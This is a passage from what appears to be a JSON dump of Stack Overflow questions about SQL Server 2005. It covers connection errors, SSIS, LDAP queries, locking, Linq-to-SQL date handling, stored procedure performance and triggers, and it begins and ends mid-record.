(\n            [0] => HYT00\n            [SQLSTATE] => HYT00\n            [1] => 0\n            [code] => 0\n            [2] => [Microsoft][SQL Server Native Client 11.0]Login timeout expired\n            [message] => [Microsoft][SQL Server Native Client 11.0]Login timeout expired\n        )\n\n    [2] => Array\n        (\n            [0] => 08001\n            [SQLSTATE] => 08001\n            [1] => -1\n            [code] => -1\n            [2] => [Microsoft][SQL Server Native Client 11.0]A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.\n            [message] => [Microsoft][SQL Server Native Client 11.0]A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.\n        )\n\n)\n</pre>\n"},{"tags":["sql","sql-server-2005","data-structures","orm"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":12674327,"title":"Quickest method for matching nested XML data against database table structure","body":"<p>I have an application which creates <code>datarequests</code> which can be quite complex. These need to be stored in the database as tables. An outline of a <code>datarequest</code> (as XML) would be...</p>\n\n<pre><code>&lt;datarequest&gt;\n  &lt;datatask view=\"vw_ContractData\" db=\"reporting\" index=\"1\"&gt;\n    &lt;datefilter modifier=\"w0\"&gt;\n      &lt;filter index=\"1\" datatype=\"d\" column=\"Contract Date\" param1=\"2009-10-19 12:00:00\" param2=\"2012-09-27 12:00:00\" daterange=\"\" operation=\"Between\" /&gt;\n    &lt;/datefilter&gt;\n    &lt;filters&gt;\n      &lt;alternation index=\"1\"&gt;\n        &lt;filter index=\"1\" datatype=\"t\" column=\"Department\" param1=\"Stock\" param2=\"\" operation=\"Equals\" /&gt;\n      &lt;/alternation&gt;\n      &lt;alternation index=\"2\"&gt;\n        &lt;filter index=\"1\" datatype=\"t\" column=\"Department\" param1=\"HR\" param2=\"\" operation=\"Equals\" /&gt;\n      &lt;/alternation&gt;\n      &lt;/filters&gt;\n    &lt;series column=\"Turnaround\" aggregate=\"avg\" split=\"0\" splitfield=\"\" index=\"1\"&gt;\n      &lt;filters /&gt;\n    &lt;/series&gt;\n    &lt;series column=\"Requested 3\" aggregate=\"avg\" split=\"0\" splitfield=\"\" index=\"2\"&gt;\n      &lt;filters&gt;\n        &lt;alternation index=\"1\"&gt;\n          &lt;filter index=\"1\" datatype=\"t\" column=\"Worker\" param1=\"Malcom\" param2=\"\" operation=\"Equals\" /&gt;\n        &lt;/alternation&gt;          \n      &lt;/filters&gt;\n    &lt;/series&gt;\n    &lt;series column=\"Requested 2\" aggregate=\"avg\" split=\"0\"  splitfield=\"\" index=\"3\"&gt;\n      &lt;filters /&gt;\n    &lt;/series&gt;\n    &lt;series column=\"Reqested\" aggregate=\"avg\" split=\"0\" splitfield=\"\" index=\"4\"&gt;\n      &lt;filters /&gt;\n    &lt;/series&gt;\n  &lt;/datatask&gt;\n&lt;/datarequest&gt;\n</code></pre>\n\n<p>This encodes a datarequest comprising a daterange, main filters, series and series filters. Basically any element which has the <code>index</code> attribute can occur multiple times within its parent element - the exception to this being the <code>filter</code> within <code>datefilter</code>.</p>\n\n<p>But the structure of this is kind of academic, the problem is more fundamental:</p>\n\n<p>When a request comes through, XML like this is sent to SQLServer as a parameter to a stored proc. This XML is shredded into a de-normalised table and then written iteratively to normalised tables such as <code>tblDataRequest (DataRequestID PK)</code>, <code>tblDataTask</code>, <code>tblFilter</code>, <code>tblSeries</code>. This is fine.</p>\n\n<p>The problem occurs when I want to <strong>match a given XML defintion with one already held in the DB</strong>. I currently do this by...</p>\n\n<ul>\n<li>Shredding the XML into a de-normalised table</li>\n<li>Using a CTE to pull <em>all the existing data</em> in the database into that same de-normalised form</li>\n<li>Matching using a huge <code>WHERE</code> condition (34 lines long)</li>\n</ul>\n\n<p>..This will return me any DataRequestID which exactly matches the XML given. I fear that this method will end up being painfully slow - partly because I don't believe the CTE will do any clever filtering, it will pull all the data every single time <em>before</em> applying the huge <code>WHERE</code>.</p>\n\n<p>I have thought there must be better solutions to this eg</p>\n\n<ul>\n<li>When storing a <code>datarequest</code>, also store a hash of the datarequest somehow and simply match on that. In the case of collision, use the current method. I wanted however to do this using set-logic. And also, I'm concerned about irrelevant small differences in the XML changing the hash - spurious spaces etc.</li>\n<li>Somehow perform the matching iteratively from the bottom up. Eg produce a list of filters which match on the lowest level. Use this as part of an <code>IN</code> to match Series. Use this as part of an <code>IN</code> to match DataTasks etc etc. The trouble is, I start to black-out when I think about this for too long.</li>\n</ul>\n\n<p><strong>Basically - Has anyone ever encountered this kind of problem before (they must have). And what would be the recommended route for tackling it?</strong> example (pseudo)code would be great :) </p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1114,"score":0,"question_id":3119867,"title":"SSIS Package failing with \"Failed to acquire connection\" error","body":"<p>We have an SSIS package that is launched from a web service.  In the Dev environment, everything works fine, but in the QA environment I get the following error when trying to run the package: \"Failed to acquire connection [ConnectionName]. Connection may not be configured correctly or you may not have the right permissions on this connection.\"</p>\n\n<p>The connection uses SQL login, not integrated. The login itself has the appropriate privileges. The SSIS package is located on the file system, not on SQL server.  I've used DTCPing and everything checks out fine between the SQL server and the Utility server. Unfortunately I know very little about SSIS itself, and am a bit of a loss as to what could be the problem.  Any suggestions would be greatly appreciated.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12674275,"title":"Find all foreign key references to a certain table","body":"<p>I have a table that I would like to find all the other tables that foreign key it. I thought this thread had the answer: <a href=\"http://stackoverflow.com/questions/483193/how-can-i-list-all-foreign-keys-referencing-a-given-table-in-sql-server-2005\">How can I list all foreign keys referencing a given table in SQL Server 2005?</a></p>\n\n<p>But after trying those things, it doesn't actually list all the tables.</p>\n"},{"tags":["sql-server-2005","aggregate-functions","divide-by-zero"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1624,"score":0,"question_id":3516111,"title":"SQL Server: How to handle divide by 0 cases in query","body":"<p>I have a query that looks like this, and which is getting a percentage:</p>\n\n<pre><code>SELECT SUM(convert(decimal(3,2),\n          CASE WHEN Status_ID = 1 AND State_ID = 14 THEN 1 ELSE 0 END))/\n          SUM(convert(decimal(3,2),CASE WHEN State_ID = 14 THEN 1 ELSE 0 END)) * 100\nFROM SomeTable\n</code></pre>\n\n<p>This may return something like 59.77803 in a normal case. But it turns that there are (rightly) cases when the second SUM -- the denominator -- could be 0. Does anyone know of a way to account for this case and avoid a divide by 0 exception?</p>\n\n<p>I'm using SQL Server 2005. Thanks.</p>\n"},{"tags":["sql-server-2005","active-directory","ldap","adsi"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":3137,"score":2,"question_id":407671,"title":"Query AD from sql server 2005","body":"<p>I am attempting to query AD via ldap from within SQL Server 2005 but get the following error:</p>\n\n<p>Msg 7321, Level 16, State 2, Line 1\nAn error occurred while preparing the query \"SELECT NAME,MAIL FROM \"LDAP:///CN=foo,CN=Users,DC=bar,DC=com\"\" for execution against OLE DB provider \"ADsDSOObject\" for linked server \"ADSI\".</p>\n\n<p>This is after executing the following stored proc:<br />\nexec sp_addlinkedserver 'ADSI', 'Active Directory Services 2.5', 'ADsDSOObject', 'adsdatasource'</p>\n\n<p>Currently I'm running the query on my local SQL Server 2005 instance.  I've tried changing the security context to 1) Made Without... , 2) made using the login's current..., and 3) Be made using this security context: specifying my own domain account.  Same error with all three.</p>\n\n<p>Not sure if it matters, but \"bar\" (see ldap query above) is not the domain of either my machine (local sql server instance) or the ldap server.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":35,"score":2,"question_id":12668343,"title":"how can i get name of table and its column while checking the reference of any value in multiple columns?","body":"<p>When deleting any Team from team table, i need to check that teamId is available in other tables or not. for this i am using following query:-</p>\n\n<pre><code>        select  count(TeamId) from \n        ( select TeamId from Project union all \n          select  TeamId from TeamMember union all \n          select  TeamId from Department union all \n          select TeamId from Role   union all \n        ) as Id where TeamId = 1\n</code></pre>\n\n<p>this query is working fine, and returns number of count. </p>\n\n<p>but now i need name of that table and its column, where i found that teamId. </p>\n\n<p>if it is possible than please give me right solution.</p>\n\n<p>thanks in advance..</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12668181,"title":"How to remove timestamp from date without converting it in varchar in sql server?","body":"<p>I am comparing a \"date\" with current date(GETDATE()) using DATEDIFF().</p>\n\n<p>The problem i am facing is that the \"date\" is in dd/MM/yyyy format and the date i am getting \nusing GETDATE() includes the timestamp also.</p>\n\n<p>Please guide me how to remove the timestamp from GETDATE(),and also want to compare these two dates.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","rowlocking"],"answer_count":3,"favorite_count":5,"up_vote_count":14,"down_vote_count":0,"view_count":9044,"score":14,"question_id":3114826,"title":"Is it possible to force row level locking in SQL Server?","body":"<p>I can see how to turn off row level and page level locking in SQL Server, but I cannot find a way to force SQL Server to use row level locking. Is there a way to force SQL Server to use row level locking and NOT use page level locking?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12665844,"title":"add primary row to query results","body":"<p>How do I add a primary row  to a query result in MSSQL 2005. Here's an example of what I need to return?</p>\n\n<p>Here are the two queries</p>\n\n<p>query 1</p>\n\n<pre><code>select product_id, sku from products\n</code></pre>\n\n<p>query 2 </p>\n\n<pre><code>select product_id, sku from childproducts\n</code></pre>\n\n<p>The results should look like this. (without the query 1, of course)</p>\n\n<pre><code>    row 1: products.product_id, products.sku   (comes from one parent table)\n    row 2: childproducts.product_id, childproducts.sku   (comes from child table)\n    row 3: childproducts.product_id, childproducts.sku   (comes from child table)\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12312161,"title":"SQL Server 2005 Agent Jobs - memory problems","body":"<p>In our company we have a problem with SQL Server Agent jobs. We have 74 Jobs that are enabled and running each day with different schedules set and of course they are overlaping because their runtime differs in length.</p>\n\n<p>We suspect that while some jobs are executing some other Job starts executing too, which has a high memory consumption so it hangs up other running Jobs and they fail (at the same time or in a matter of 1 - 3 seconds) with message:</p>\n\n<blockquote>\n  <p>There is insufficient system memory to run this query. [SQLSTATE 42000] (Error 701).  The step failed.</p>\n</blockquote>\n\n<p>Is there a solution or maybe advices how to discover a problem?</p>\n\n<p>What I've tried:</p>\n\n<ol>\n<li>Change the execution times of Jobs;</li>\n<li>Use a SQL Server Profiler to see which SPs are executing by Agent Jobs;</li>\n<li>Tried to split some Jobs in 3 - 4 pieces because they had 18-22 Steps inside;</li>\n<li>And of course - googled.</li>\n</ol>\n"},{"tags":["asp.net","sql-server-2005","linq-to-sql","datetime","update-statement"],"answer_count":1,"favorite_count":3,"up_vote_count":14,"down_vote_count":0,"view_count":841,"score":14,"question_id":8010507,"title":"Linq-to-SQL and DateTime weirdness","body":"<p>We have really strange and inconsistent behavior with <a href=\"http://en.wikipedia.org/wiki/Language_Integrated_Query#LINQ_to_SQL_.28formerly_called_DLINQ.29\" rel=\"nofollow\">Linq-to-SQL </a> here.</p>\n\n<p>Our application is installed at quite a few customers' sites, and it works just fine for the most part. One of the queries in Linq-to-SQL updates a table and set a <code>DateTime</code> column to a new value.</p>\n\n<p>In all the cases - including our development and test systems - this Linq-to-SQL statement gets translated into something along the lines of:</p>\n\n<pre><code>UPDATE dbo.OurTable \nSET WorkTimeStamp = @WTS \nWHERE ID = @ID\n\n@WTS = '2011-11-04 14:15:25', @ID = 555\n</code></pre>\n\n<p>However, at one customer's site, for reasons that aren't clear to us (yet), this update gets translated into:</p>\n\n<pre><code>UPDATE dbo.OurTable \nSET WorkTimeStamp = @WTS \nWHERE ID = @ID\n\n@WTS = 'Nov  4 2011 02:15:25PM', @ID = 555\n</code></pre>\n\n<p>and for some reason then fails on <a href=\"http://en.wikipedia.org/wiki/Microsoft_SQL_Server#SQL_Server_2005\" rel=\"nofollow\">SQL Server 2005</a>.</p>\n\n<p>Now, that customer's servers (web server and SQL Server) have US-English versions of Windows Server 2008 installed; the language in SQL Server is set to <code>us_english</code>, the date format is set to <code>mdy</code>, the user account running the update has its language set to <code>English</code> in SQL Server ..... and that setup is the same elsewhere (for example, on our test server infrastructure).</p>\n\n<p>So my question really is:</p>\n\n<ol>\n<li><p><strong>Why on earth</strong> does Linq-to-SQL suddenly create a totally different representation of the same <code>DateTime</code> to send to SQL Server? Is there any knob to turn to control this?</p></li>\n<li><p>And why can't ADO.NET and the SQL Server 2005 SP2 database handle that <code>UPDATE</code> statement correctly? We're getting an error in our log that reads:</p></li>\n</ol>\n\n<blockquote>\n  <p>SqlTypeException - SqlDateTime overflow. Must be between 1/1/1753 12:00:00 AM and 12/31/9999 11:59:59 PM.</p>\n</blockquote>\n\n<p>It seems to be a .NET error (more than a SQL Server error) and it seems as if .NET cannot really interpret that <code>Nov  4 2011 02:15:25PM</code> as a valid <code>DateTime</code> for some reason. When attempting to run the generated UPDATE statement in <a href=\"http://en.wikipedia.org/wiki/SQL_Server_Management_Studio\" rel=\"nofollow\">SQL Server Management Studio</a>, we cannot seem to \"force\" that error to happen - the <code>UPDATE</code> happily works just fine.....</p>\n\n<p><strong>Update:</strong> some further investigation seems to indicate Linq-to-SQL behaves differently when going against SQL Server 2005 or 2008.</p>\n\n<ul>\n<li>with SQL Server <strong>2005</strong>, our dates get turned into: <code>Nov  4 2011 02:15:25PM</code>   </li>\n<li>with SQL Server <strong>2008</strong>, our dates get turned into: <code>2011-11-04 02:15:25PM</code>   </li>\n</ul>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":4592,"score":2,"question_id":704914,"title":"SQL Server - An error occurred while executing batch. Error message is: The directory name is invalid","body":"<p>Our database server had run out of disk space, after freeing up some disk space any query run in sql server management studio, with the results sent to grid view, resulted in this error:<br />\nAn error occurred while executing batch. Error message is: The directory name is invalid.</p>\n\n<p>When the results sent to text view the queries worked fine.  </p>\n\n<p>Does anyone know why this error occurs and how to get rid of it?</p>\n"},{"tags":["vb.net","sql-server-2005","setup","remote-connections"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":239,"score":0,"question_id":12644987,"title":"Creating setup in vb.net with sql server","body":"<p>Is there any possible way to create a setup in for my program written in vb.net using sql server as the backend.I have a module which creates the database code and i have also created a setup in vb.net for my project but i want this setup to run properly even in a system which doesnt have visual studio and sql server installed.I tried running it on a system which doesnt have both but the error i get is sql server 2005 doesn't allow remote connections in default settings,i tried changing some settings but nothing seems to work.Is it necessary for a server to be there for creating the database?</p>\n"},{"tags":["tsql","sql-server-2005","select","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":94,"score":2,"question_id":12637774,"title":"T-SQL Parse text in select statement","body":"<p>I am currently working on a project to import data from one table to another. I am trying to parse a field that contains a FULLNAME into its parts LAST,FIRST,MI. The names are all in the format of \"LAST,FIRST MI\" I have written a stored procedure that correctly parses and returns the results as neccessary but I am unsure as to how to encorporate the stored procedure into a single select statement. For instance, current I have:</p>\n\n<pre><code>SELECT FULLNAME From UserInfo\n</code></pre>\n\n<p>and what I would like to have is something like this:</p>\n\n<pre><code>SELECT Last, First, MI from UserInfo\n</code></pre>\n\n<p>Currently my stored procedure takes the form of ParseName(FULLNAME, Last as OUTPUT, First as OUTPUT, MI as OUTPUT). How can I call this procedure and have the output variables split into 3 different columns?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","pagination"],"answer_count":3,"favorite_count":5,"up_vote_count":5,"down_vote_count":0,"view_count":1009,"score":5,"question_id":3747186,"title":"Best paging solution using SQL Server 2005?","body":"<p>What is the most efficient paging solution using SQL Server 2005 against a table with around 5,000-10,000 rows? I've seen several out there but nothing comparing them.</p>\n"},{"tags":["sql-server","performance","sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":2586,"score":4,"question_id":3995386,"title":"Query runs fast, but runs slow in stored procedure","body":"<p>I am doing some tests using the SQL 2005 profiler.</p>\n\n<p>I have a stored procedure which simply runs one SQL query.</p>\n\n<p>When I run the stored procedure, it takes a long time and performs 800,000 disk reads.</p>\n\n<p>When I run the same query separate to the stored procedure, it does 14,000 disk reads.</p>\n\n<p>I found that if I run the same query with OPTION(recompile), it takes 800,000 disk reads.</p>\n\n<p>From this, I make the (possibly erroneous) assumption that the stored procedure is recompiling each time, and that's causing the problem.</p>\n\n<p>Can anyone shed some light onto this? </p>\n\n<p>I have set ARITHABORT ON. (This solved a similar problem on stackoverflow, but didn't solve mine)</p>\n\n<p>Here is the entire stored procedure:</p>\n\n<pre><code>CREATE PROCEDURE [dbo].[GET_IF_SETTLEMENT_ADJUSTMENT_REQUIRED]\n @Contract_ID int,\n @dt_From smalldatetime,\n @dt_To smalldatetime,\n @Last_Run_Date datetime\nAS\nBEGIN\n DECLARE @rv int\n\n\n SELECT @rv = (CASE WHEN EXISTS\n (\n  select * from \n  view_contract_version_last_volume_update\n  inner join contract_version\n  on contract_version.contract_version_id = view_contract_version_last_volume_update.contract_version_id\n  where contract_version.contract_id=@Contract_ID\n  and volume_date &gt;= @dt_From\n  and volume_date &lt; @dt_To\n  and last_write_date &gt; @Last_Run_Date\n )\n THEN 1 else 0 end)\n\n -- Note that we are RETURNING a value rather than SELECTING it.\n -- This means we can invoke this function from other stored procedures\n return @rv\nEND\n</code></pre>\n\n<p>Here's a script I run that demonstrates the problem:</p>\n\n<pre><code>DECLARE \n @Contract_ID INT,\n @dt_From smalldatetime,\n @dt_To smalldatetime,\n @Last_Run_Date datetime,\n    @rv int\n\n\nSET @Contract_ID=38\nSET @dt_From='2010-09-01'\nSET @dt_To='2010-10-01'\nSET @Last_Run_Date='2010-10-08 10:59:59:070'\n\n\n-- This takes over fifteen seconds\nexec GET_IF_SETTLEMENT_ADJUSTMENT_REQUIRED @Contract_ID=@Contract_ID,@dt_From=@dt_From,@dt_To=@dt_To,@Last_Run_Date=@Last_Run_Date\n\n-- This takes less than one second!\nSELECT @rv = (CASE WHEN EXISTS\n(\n select * from \n view_contract_version_last_volume_update\n inner join contract_version\n on contract_version.contract_version_id = view_contract_version_last_volume_update.contract_version_id\n where contract_version.contract_id=@Contract_ID\n and volume_date &gt;= @dt_From\n and volume_date &lt; @dt_To\n and last_write_date &gt; @Last_Run_Date\n)\nTHEN 1 else 0 end)\n\n\n-- With recompile option. Takes 15 seconds again!\nSELECT @rv = (CASE WHEN EXISTS\n(\n select * from \n view_contract_version_last_volume_update\n inner join contract_version\n on contract_version.contract_version_id = view_contract_version_last_volume_update.contract_version_id\n where contract_version.contract_id=@Contract_ID\n and volume_date &gt;= @dt_From\n and volume_date &lt; @dt_To\n and last_write_date &gt; @Last_Run_Date\n)\nTHEN 1 else 0 end) OPTION(recompile)\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12614877,"title":"Table stuck when delete matching records within another table","body":"<p>I have a <strong>table A</strong> having around 15 millions of records. I have a process which delete and insert data into <strong>table A</strong> from another temp <strong>table B</strong>.</p>\n\n<p>It was working good and another user does not access this <strong>table A</strong> directly. The process scenario is - \n1) delete all matching records from <strong>table A</strong> with <strong>table B</strong>. \n2) Insert new fresh data into <strong>table A</strong> from <strong>table B</strong>.</p>\n\n<p>But sometime process is going to stuck. I have checked it but did not get any solution. </p>\n\n<p>A) So, I have created new table in place of <strong>table A</strong> and fetch the old data into new table from <strong>table A</strong>. After sometime, I got the same issue with new table.</p>\n\n<p>B) Next time, I have created another table in place of <strong>table A</strong> but did not insert old records in this table. Now, process is working fine. </p>\n\n<p>But I need a solution to put all records in the <strong>table A</strong>. \n<strong>Please,Can anybody help on it?</strong></p>\n\n<p>I'm using <strong>SQL Server 2005 Enterprise version</strong>. This process is done via <strong>store procedure</strong>. Table does not have any index. There is only simply delete and insert only. </p>\n"},{"tags":["java","sql-server-2005","database-connection","tcp-ip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":189,"score":0,"question_id":12496045,"title":"Error:The TCP/IP connection to the host has failed. java.net.ConnectException: Connection refused: connect ","body":"<p>I am using</p>\n\n<ul>\n<li>Windows 7  </li>\n<li>Netbeans IDE 7.1.2  </li>\n<li>SQL Server Management Studio Express 2005  </li>\n<li>JDK1.6</li>\n</ul>\n\n<p>I am getting the below error while connecting to the database:</p>\n\n<blockquote>\n  <p>com.microsoft.sqlserver.jdbc.SQLServerException: The TCP/IP connection to the host  has failed. java.net.ConnectException: Connection refused: connect  </p>\n</blockquote>\n\n<p>My connection string is: </p>\n\n<pre><code>Class.forName(\"com.microsoft.sqlserver.jdbc.SQLServerDriver\");  \nConnection connection = DriverManager.getConnection(  \n    \"jdbc:sqlserver://127.0.0.1:1433;databaseName=dbcm;\" +  \n    \"user=sa;password=sa\");\n</code></pre>\n\n<p>I've checked below things:  </p>\n\n<ol>\n<li>In SQL Server Configuration Manager, Protocols for SQLEXPRESS : TCP/IP Enabled\nIn fact I made enable remaining 3 too.  </li>\n<li>SQL Server(SQLExpress) and SQL Browser Service both are running.</li>\n</ol>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":11288850,"title":"Create trigger for automatically inserting another record when a condition is matched for the record inserted","body":"<p>I have 2 tables Headers and details, header stores the headers and the details stores the product and quantity.\nI want to add a product B with the same quantity when product A is inserted in order with the same quantity as of product A, and also update the headers table using triggers.</p>\n\n<p>Please help</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","service-broker"],"answer_count":5,"favorite_count":5,"up_vote_count":15,"down_vote_count":0,"view_count":1673,"score":15,"question_id":507721,"title":"Is anyone using the Service Broker in SQL Server?","body":"<p>When I attended a presentation of SQL Server 2008 at Microsoft, they did a quick gallup to see what features we were using. It turned out that in the entire lecture hall, my company was the only one using the Service Broker. This surprised me a lot, as I thought that more people would be using it.</p>\n\n<p>My experience with SB is that it does it's job well, but is pretty tough to administer and it's hard to get an overview. </p>\n\n<p>So, have you considered using the Service Broker? If not, why not? Did you go for MSMQ instead? Is there anything in SQL Server 2008 that would make you consider using the Service Broker.</p>\n"},{"tags":["sql-server","string","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":12647808,"title":"Why subquery inside recursive string concatenation always returns NULL?","body":"<p>Suppose I have two tables:</p>\n\n<ul>\n<li>TABLE1: Has a list of IDs I need to process.</li>\n<li>TABLE2: Has key-value pairs of ID's and values.</li>\n</ul>\n\n<p>I need to retrieve the values from TABLE2 for all the IDs in TABLE1, as a single string. In order to achieve this, I made the next query:</p>\n\n<pre><code>DECLARE @id INT, @value VARCHAR(10);\n\nSELECT @id=0, @value='';\n\nSELECT\n    @value = @value + (SELECT TOP 1 value FROM TABLE2 WHERE id=@id) + '-',\n    @id = @id+1\nFROM TABLE1\n</code></pre>\n\n<p>But when I run this query, the subquery always returns null (and, therefore, <code>@value=NULL</code> at the end). My question is: Why does the subquery <code>SELECT TOP 1 value FROM TABLE2 WHERE id=@id</code> always returns NULL, even if the ID is found in TABLE2?</p>\n"},{"tags":["sql","tsql","sql-server-2005","boolean"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12646063,"title":"boolean expression with min/max in nullif possible?","body":"<p>is it possible to put a boolean expression with max or min into a nullif() statemtent?</p>\n\n<p>for example</p>\n\n<pre><code>select \n    min(a) as b ---grabbing first value\n    ,max(a) as  c --- grabbing last value but could be same as min value, this is the problem\n    ,nullif(min(a), (min(a) = max(a))) ---my idea for a solution that didnt work\n   from table\n</code></pre>\n\n<p>trying to weed out duplicate rows when a field has a value that only happens 1 time.  I am thinking there may be a way to do this with counting and then weeding out all values with a value over 1 but am not sure how to accomplish that. working on sql server 2005, need this in t-sql if possible, anything that will work on the server is ok though. </p>\n\n<p>edit to provide more info: \ni am looking at a status history for orders in an order management system that tags each time a correction is requested with an id.  the id's are unique and numerical. in this format 1234  each orderid is unique and numerical as well in this format 1111111.2. a represents the unique correction id.  I want to look at the order, and if one correction id has already happened to grab the next one ideally, and the next after that and so on if possible. At very minimum i would want the MAX value and MIN value. i cannot just do two columns because that would count the min value twice (using my example) and will not give me accurate data</p>\n\n<p>was trying to be simple with my example but its not providing enough info, here is more:</p>\n\n<pre><code>SELECT Cast(oi.orderid AS VARCHAR(MAX)) + '.' \n                 + Cast(oi.orderitemid AS VARCHAR(MAX)) AS OrderNumber,\n       Min(oici.orderitemcorrectionid)                  AS a,\n       Max(oici.orderitemcorrectionid)                  AS b\nFROM   Orderitems oi\n       LEFT JOIN orderitemcorrections oic\n         ON oic.orderid = oi.orderid\n            AND oic.orderitemid = oi.orderitemid\n       LEFT JOIN orderitemcorrectionissues oici\n         ON oici.orderitemcorrectionid = oic.orderitemcorrectionid\n       LEFT JOIN correctiontypes ct\n         ON ct.correctiontypeid = oici.correctiontypeid\nGROUP  BY Cast(oi.orderid AS VARCHAR(MAX)) + '.' \n                   + Cast(oi.orderitemid AS VARCHAR(MAX)) \n</code></pre>\n\n<p>sample table data of above query:</p>\n\n<pre><code>OrderNumber a   b\n1098048.1   1   2\n1098210.1   160 160\n1098222.1   78  78\n1098300.1   31  31\n1098408.1   4   4\n1098462.1   224 224\n1098468.1   602 602\n1098492.2   1457 1457\n</code></pre>\n\n<p>above is data where a and b are the same\nbelow is where they are different but i want to null any duplicates from a to b</p>\n\n<pre><code>1100268.1   181 191\n1100256.1   306 379\n</code></pre>\n\n<p>more data, not grouped to show duplicates for rows. -- sample raw data</p>\n\n<pre><code>OrderNumber orderitemcorrectionid\n1098048.1   1\n1098048.1   2\n1098210.1   160\n1098210.1   160\n</code></pre>\n"},{"tags":["sql-server-2005","triggers"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":195,"score":1,"question_id":9195495,"title":"How do I see the NTusername in trigger?","body":"<p>SQL Server Profiler shows NtUsername.\nHow do I see the NTusername in trigger?</p>\n\n<p>I don't understand. SQL Server Profiler shows the Windows username. SUSER_NAME, SUSER_SNAME ORIGINAL_LOGIN, USER, USER_NAME shows the username of the SQL user account. I want what the Profiler is showing. There must be a way if the profiler can do it.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12642246,"title":"deleted value of the after delete trigger","body":"<p>I've got problems with my triggers (add and delete):</p>\n\n<pre><code>ALTER TRIGGER [trgAfterShoppingInserted]\nON [ShopingList] AFTER INSERT \nAS BEGIN\n   DECLARE @cardId char(6), @points int, @userId int\n\n   SET @cardId = (SELECT cardId FROM inserted)\n   SET @points = (SELECT points FROM inserted)\n   SET @userId = (SELECT userId from [Card] WHERE id = @cardId)\n   IF @userId = 0\n   BEGIN\n   Update [Card]\n   set points = points + @points\n   where id =@cardId\n   END\n   ELSE\n   Update [Card]\n   set points = points + @points\n   where id =@cardId OR\n   userId = @userId\nEND\n\n\nALTER TRIGGER [trgAfterShoppingDeleted]\nON [ShopingList] AFTER DELETE \nAS BEGIN\n   DECLARE @cardId char(6), @points int, @userId int\n\n   SET @cardId = (SELECT cardId FROM inserted)\n   SET @points = (SELECT points FROM inserted)\n   SET @userId = (SELECT userId from [Card] WHERE id = @cardId)\n   IF @userId = 0\n   BEGIN\n   Update [Card]\n   set points = points - @points\n   where id =@cardId\n   END\n   ELSE\n   Update [Card]\n   set points = points - @points\n   where id =@cardId OR\n   userId = @userId\nEND\n</code></pre>\n\n<p>The problem is on the <code>SET @cardId..</code></p>\n\n<p>The error is:</p>\n\n<blockquote>\n  <p><em>Subquery returned more than 1 value. This is not permitted when the subquery follows =, !=, &lt;, &lt;= , >, >= or when the subquery is used as an expression.</em></p>\n</blockquote>\n\n<p>how is it possibile ?</p>\n\n<p>thanks for any help</p>\n"},{"tags":["sql-server-2005","tsql","stored-procedures","full-text-search"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":123,"score":1,"question_id":5605097,"title":"COALESCE together with FTS","body":"<p>I have a form that has a 'brand' dropdown and a 'model' dropdown.I am searching for cars here that has some brand and/or a model.\nNow if I choose \"all\" from the 'brand' dropdown and some 'model' value other then the \"all\" ,I use </p>\n\n<blockquote>\n  <p>COALESCE(@brand,cars.brand)</p>\n</blockquote>\n\n<p>and </p>\n\n<blockquote>\n  <p>COALESCE(@model,cars.model)</p>\n</blockquote>\n\n<p>, it works fine as in returning all the cars if I choose \"all\" for both the dropdown menus and specific results if I choose some value.\nNow I want to use FTS with the <code>CONTAINS</code> keyword and using a query like </p>\n\n<pre><code>CONTAINS(cars.model , 'COALESCE(@model,cars.model)')\n</code></pre>\n\n<p>is returning with an error as </p>\n\n<blockquote>\n  <p>Syntax error near '(' in the full-text search condition 'COALESCE(@model,cars.model)'.</p>\n</blockquote>\n\n<p>I would really 